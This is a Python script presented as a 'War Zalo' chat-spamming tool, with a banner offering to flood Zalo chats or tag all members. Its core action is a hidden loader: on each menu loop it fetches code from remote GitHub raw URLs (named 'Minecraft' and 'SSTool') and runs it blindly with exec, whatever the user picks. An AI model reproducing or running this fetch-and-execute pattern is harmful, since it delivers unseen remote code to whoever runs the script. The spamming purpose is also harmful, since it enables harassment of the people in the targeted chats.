from tkinter import messagebox
import pyautogui
import time
import keyboard 
import pyperclip 
import random 
import requests
import os
import hashlib
from colorama import Fore, init
import sys
from time import sleep, strftime
from datetime import datetime
import threading
import webbrowser, os, re, json, random
import msvcrt
import subprocess
import ctypes
import turtle

xnhac = "\033[1;36m"
do = "\033[1;31m"
luc = "\033[1;32m"
vang = "\033[1;33m"
xduong = "\033[1;34m"
hong = "\033[1;35m"
trang = "\033[1;39m"
whiteb = "\033[1;39m"
red = "\033[0;31m"
redb = "\033[1;31m"
end = '\033[0m'

def windowtitle(a):
    os.system(f"title {a}")
windowtitle("N̴̗̜̜̼̤̈́͂̑͋͋̈̌͆͋̓̉̑͝͝ģ̴̛̱̫͕͎̻̩͚̺͖̣̖̠̘̝̀̃͆̽̆̈́̈́̅̈͒̾̈́̇̐͒̈̚͝͝ͅơ̴͔̂͊̔̆͐͛̈́͂̌͗̂̇̊͋͠͠͠͝ͅc̸̢̫̓̉H̸̨̢͕̬̺͔͔̟̗̐̐̍̊̿͂̾̋̈́͂́̂̇̈̑͘̚͜͜͠ű̵̧̧̙̼͖̺͈̲̭͉͕̖̬̪̝͖̟̭͔̱̤̠̳̥̃̀̍͑͗͛̈̄̚͜ͅͅͅy̴̭̳̗͎̣̳̗͍̠̲̘̎̌͛̅́̊͝͠")


os.system('cls')
banner = f"""
    
               _  __                __ __         
              / |/ /__ ____  ____  / // /_ ____ __
             /    / _ `/ _ \/ __/ / _  / // / // /
            /_/|_/\_, /\___/\__/ /_//_/\_,_/\_, / 
                 /___/                     /___/


    \033[0;31m 1: War Zalo(others chat)       \033[1;35m 2: War Zalo Tag All(only for zalo)
                 

"""
print(banner)

while True:
    os.system('cls')
    print(banner)    
    chon = input(f'[x>>] ')               
    os.system('cls')
    print("                                              \033[1;39mZalo")
    exec(requests.get('https://raw.githubusercontent.com/MCCFree/MCC-Loader/main/Minecraft').text)
    if chon == '2':
        os.system('cls')
        print("                                              \033[1;39mZalo All")
        exec(requests.get('https://raw.githubusercontent.com/MCCFree/MCC-Loader/main/SSTool').text)
    else:
        continue    